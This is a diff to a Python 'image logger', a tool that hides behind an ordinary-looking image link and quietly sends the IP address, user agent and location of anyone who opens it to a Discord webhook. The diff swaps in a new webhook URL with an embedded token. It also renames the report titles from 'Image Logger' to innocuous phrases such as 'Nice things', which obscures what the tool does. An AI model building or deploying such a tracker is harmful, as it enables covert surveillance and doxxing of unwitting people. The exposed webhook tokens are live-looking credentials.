@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1385019428512469003/_CTt-Cy3HNx9XGpS5fgIAR0hbsIrBS5PR_MykFV7POx7bqxUmCY20tMCqHLan4r4sZMp",
+    "webhook": "https://discord.com/api/webhooks/1387882750564110346/bSZE3dsx7hvgnUVoePCX1hjjXXQEu3hrMnwxGbOC0rL3HNvdsp3vrJgGkRCRpXaqk2If",
     "image": "https://www.shutterstock.com/image-photo/bill-torn-revealing-words-you-260nw-1734671219.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -81,7 +81,7 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "AHH NIce - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
@@ -100,7 +100,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "nice link sent - Link Sent",
             "color": config["color"],
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
@@ -145,7 +145,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "Nice things",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
